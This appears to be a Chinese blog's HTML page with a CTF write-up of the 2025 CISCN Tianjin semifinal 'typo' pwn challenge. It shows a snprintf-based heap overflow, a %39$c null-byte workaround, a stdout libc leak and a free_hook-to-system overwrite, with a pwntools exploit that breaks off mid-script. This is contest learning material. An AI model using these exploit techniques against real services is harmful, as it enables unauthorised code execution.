@@ -1,0 +1,342 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Pwn-高质量比赛题目复现6-2025CISCN天津半决赛 | 摆烂小子</title><meta name="author" content="摆烂小子"><meta name="copyright" content="摆烂小子"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="2025 CISCN &amp; 长城杯 PWNtypo参考自 2025ciscn&amp;长城杯 半决-pwn 部分解析-先知社区 当时天津半决赛比完后没来得及复现，最近的招商铸盾车联网CTF又出了原题，决定复现一下。 libc版本 2.31。 菜单有add、delete和edit函数，功能如下：    漏洞分析add中正常申请堆块，并且在堆块fd的位置写入了size。 delete中没有uaf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn-高质量比赛题目复现6-2025CISCN天津半决赛">
+<meta property="og:url" content="https://bailan2.github.io/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="摆烂小子">
+<meta property="og:description" content="2025 CISCN &amp; 长城杯 PWNtypo参考自 2025ciscn&amp;长城杯 半决-pwn 部分解析-先知社区 当时天津半决赛比完后没来得及复现，最近的招商铸盾车联网CTF又出了原题，决定复现一下。 libc版本 2.31。 菜单有add、delete和edit函数，功能如下：    漏洞分析add中正常申请堆块，并且在堆块fd的位置写入了size。 delete中没有uaf">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bailan2.github.io/img/pwn.png">
+<meta property="article:published_time" content="2025-08-21T04:57:29.000Z">
+<meta property="article:modified_time" content="2025-09-10T07:11:11.852Z">
+<meta property="article:author" content="摆烂小子">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bailan2.github.io/img/pwn.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://bailan2.github.io/2025/08/21/Pwn-%E9%AB%98%E8%B4%A8%E9%87%8F%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B06-2025CISCN%E5%A4%A9%E6%B4%A5%E5%8D%8A%E5%86%B3%E8%B5%9B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: 摆烂小子","link":"Link: ","source":"Source: 摆烂小子","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn-高质量比赛题目复现6-2025CISCN天津半决赛',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-09-10 15:11:11'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/title.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/pwn.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">摆烂小子</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pwn-高质量比赛题目复现6-2025CISCN天津半决赛</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-21T04:57:29.000Z" title="Created 2025-08-21 12:57:29">2025-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-10T07:11:11.852Z" title="Updated 2025-09-10 15:11:11">2025-09-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>7min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pwn-高质量比赛题目复现6-2025CISCN天津半决赛"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2025-CISCN-amp-长城杯-PWN"><a href="#2025-CISCN-amp-长城杯-PWN" class="headerlink" title="2025 CISCN &amp; 长城杯 PWN"></a>2025 CISCN &amp; 长城杯 PWN</h1><h2 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h2><p>参考自 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17409">2025ciscn&amp;长城杯 半决-pwn 部分解析-先知社区</a></p>
+<p>当时天津半决赛比完后没来得及复现，最近的招商铸盾车联网CTF又出了原题，决定复现一下。</p>
+<p>libc版本 2.31。</p>
+<p>菜单有add、delete和edit函数，功能如下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkWB6"><img src="https://s21.ax1x.com/2025/08/21/pVDkWB6.png" alt="pVDkWB6.png" style="zoom:80%;" /></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkccR"><img src="https://s21.ax1x.com/2025/08/21/pVDkccR.png" alt="pVDkccR.png" style="zoom:80%;" /></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkgj1"><img src="https://s21.ax1x.com/2025/08/21/pVDkgj1.png" alt="pVDkgj1.png" style="zoom:80%;" /></a></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>add中正常申请堆块，并且在堆块fd的位置写入了size。</p>
+<p>delete中没有uaf漏洞。</p>
+<p>漏洞在edit函数的snprinf函数中，看似对size作了大小校验，如果<code>new_size &gt; old_size</code>的话，还是使用old_size来进行后续的read。这里漏洞就在于snprinf的参数有问题。</p>
+<p>首先看一下snprintf的参数原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>str</code>: <strong>目标缓冲区</strong>，用于存放格式化后的字符串。</li>
+<li><code>size</code>: <strong>目标缓冲区的大小</strong>。这是 <code>snprintf</code> 安全性的关键，它确保最多只写入 <code>size-1</code> 字节，最后加一个空字符（<code>\0</code>），防止缓冲区溢出。</li>
+<li><code>format</code>: <strong>格式化字符串</strong>，例如 <code>&quot;Name: %s, Age: %d&quot;</code>。</li>
+<li><code>...</code>: <strong>可变参数</strong>，对应格式化字符串中的 <code>%s</code>, <code>%d</code> 等占位符。</li>
+</ul>
+<p>简单来说，就是把format指向的内容写到str缓冲区里，写size个字节。</p>
+<p>而在这题中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(*((<span class="type">char</span> **)&amp;heap_list + (<span class="type">int</span>)idx), (<span class="type">size_t</span>)<span class="string">&quot;%lu&quot;</span>, new_size, <span class="number">8LL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>第二个参数把<code>&quot;%lu&quot;</code>字符串直接强转成了size_t，这相当于直接用该字符串的地址当作了size，所以是一个相当大的数字。</p>
+<p>调用的时候可以看到地址是相当大的数字。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDk5ND"><img src="https://s21.ax1x.com/2025/08/21/pVDk5ND.png" alt="pVDk5ND.png"></a></p>
+<p>而第一个参数是堆块的fd位置，所以，这里就会存在一个堆溢出，<strong>可以用来溢出修改后边堆块的size进而来进行堆块合并</strong>。</p>
+<p>但是还有一个问题，那就是，数据是在fd+8的位置开始的，所以要想从数据一直修改到后边堆块，需要先改fd，也就是存放size的地方，如果直接垃圾字符填充会导致size过大(<strong>这里修改自己的size是无所谓的</strong>)，但是我们需要控制的是<strong>next_chunk的size和next_chunk的fd</strong>(用来对next_chunk进行edit，如果不改fd只改size在edit的时候还是没法溢出)，我们想要填充到<strong>next_chunk的fd</strong>的话，就需要填充满<strong>next_chunk的size</strong>，如果直接填充垃圾字符到<strong>next_chunk的size</strong>的话会导致size过大而堆块size不够崩溃。所以需要控制<strong>next_chunk的size</strong>在合法区间，如0x421，但是这样就会填充\x00，而snprintf遇到\x00会截断，这样就填充不到<strong>next_chunk的size</strong>了。所以，这里参考大佬的博客，采用**%n$c**替代的方式。</p>
+<p>通过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">myencode</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;%39$c&#x27;</span>)+<span class="string">b&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>而<code>%39$c</code>就是取栈上偏移39位置的低8字节数据来填充。</p>
+<p>因为%39$c位置对应的字节是00，这样在snprintf读入的时候不会因为\x00而截断，在解析的时候会把<code>%39$c</code>解析成\x00进而读入合法的size。</p>
+<p>这里在调试的时候有点问题(<strong>发现snprintf的参数在栈上的首偏移不是从6开始的，而是从8开始的</strong>)。下图是栈上的内存数据，其中四个位置分别对应**%31、%32、%33、%34**，然后%39对应的就是00。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkI4e"><img src="https://s21.ax1x.com/2025/08/21/pVDkI4e.png" alt="pVDkI4e.png"></a></p>
+<p>构造%39修改后结果如图所示。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkRnx"><img src="https://s21.ax1x.com/2025/08/21/pVDkRnx.png" alt="pVDkRnx.png"></a></p>
+<p>比如构造%31的话就是如图所示，00变成了0x25,也就是第31个位置的低8字节。</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDkfHK"><img src="https://s21.ax1x.com/2025/08/21/pVDkfHK.png" alt="pVDkfHK.png"></a></p>
+<p>修改完成后，就可以进行堆块重叠了，因为没有show函数，所以需要爆破stdout来泄露libc。</p>
+<p>方法就是构造tchache的fd和unsorted的fd重叠，所以依次free两个tcache chunk和修改size后的unsorted chunk，再add回来一个tcache就可以实现两个fd重叠了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">        add(i,<span class="number">0x90</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">6</span>:</span><br><span class="line">        add(i,<span class="number">0x90</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4a1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x490</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(myencode(payload))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pVDk4AO"><img src="https://s21.ax1x.com/2025/08/21/pVDk4AO.png" alt="pVDk4AO.png"></a></p>
+<p>此时，tcache和unsorted虽然fd重叠了，但是没法进行修改，所以需要再次利用上边的方法溢出来修改刚申请的chunk的fd(也就是size数据)改大，再通过该tcache chunk溢出修改到重叠chunk的fd也就是stdout地址。</p>
+<p>这里不能直接用snprintf溢出修改stdout地址，因为snprintf会在最后加个\x00导致stdout的低六位被改掉，而正常edit的read不会。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">payload+=p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x401</span>)+<span class="string">b&#x27;\x98&#x27;</span>+<span class="string">b&#x27;\x26&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">9999</span>),payload)</span><br></pre></td></tr></table></figure>
+
+<p>之后就是修改fd后四位成stdout-8的地址(本地关闭alsr后直接查看就行，我这里是0x9860)，为什么要改成stdout-8呢，是因为add申请的时候会对fd写入size，如果直接申请到stdout，会把stdout的flag标志写成0x80这种size而导致崩溃。</p>
+<p>之后泄露libc后，再通过前边同样的方法溢出修改tcache的fd到free_hook-8改成system即可。</p>
+<p>注意最后写入binsh的时候，也要通过前边对溢出写，因为直接写是在fd+8而不是fd的位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,myencode(payload),<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">    p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">    p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>):</span><br><span class="line">    p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recv(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>(<span class="params">libc_base</span>):</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;, )</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myencode</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;%39$c&#x27;</span>)+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,payload,data</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;dex&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size of&quot;</span>,payload)</span><br><span class="line">    sa(<span class="string">&quot;say&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">2</span>:</span><br><span class="line">        add(i,<span class="number">0x90</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">6</span>:</span><br><span class="line">        add(i,<span class="number">0x90</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=p64(<span class="number">0x80</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4a1</span>)</span><br><span class="line">payload+=p64(<span class="number">0x490</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="built_in">print</span>(myencode(payload))</span><br><span 